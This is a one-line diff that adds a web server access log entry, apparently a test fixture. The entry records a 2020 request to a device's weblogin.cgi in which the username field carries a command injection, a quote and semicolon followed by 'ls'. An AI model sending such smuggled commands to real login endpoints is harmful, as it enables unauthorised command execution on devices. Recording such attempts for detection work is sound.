@@ -1,0 +1,1 @@
+78.151.31.228 - - [06/May/2020:05:03:05 +0300] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf HTTP/1.1" 301 162 "-" "-" "Mozilla/5.0"
